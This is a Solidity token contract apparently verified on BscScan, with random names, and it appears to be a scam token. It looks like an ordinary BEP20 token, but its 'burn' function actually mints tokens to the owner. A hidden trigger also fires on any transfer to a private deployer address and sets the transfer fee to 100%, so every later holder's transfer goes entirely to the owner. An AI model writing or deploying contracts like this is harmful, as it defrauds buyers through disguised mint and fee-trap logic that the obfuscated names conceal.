/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 13:16:20 GMT+8
 */
pragma solidity >=0.5.11;
contract azmrhY {
uint256 public  wmbuNE = 100000000000000000000000;
address public  wZyEcW = address(0);
mapping (address => uint256) public balanceOf;
uint256 public  xBkWCB = 100000000000000000000;
uint256 public constant aeTvaR = 9+1;
string public  name = "VDvkpj";
address public  wiiJmt = address(0);
uint256 public  NWAlGw = 100000000000000000000000;
uint256 public  skFQNy = 10000000000000000;
address public  lHnKcv = address(0);
uint8 public constant decimals = 18;
address private  YuvnHj = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  qaESdx = 100000000000000000;
address public owner;
address public  CGsSOi = address(0);
uint256 private  jLDhZp = 10000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public  kCjrgd = address(0);
address public  pZXxIQ = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "jmpxHI";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  zrmBBw = 10000000000000000000000000000;
uint256 public  XIrFEE = 1000000000000000000;
uint256 public  DPwJpp = 10000000000000000000;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
YuvnHj = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "NRAWMz");
require(to != address(0), "NRAWMz");
require(amount <= balanceOf[from], "NRAWMz");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* aeTvaR/jLDhZp ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==YuvnHj){
jLDhZp = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}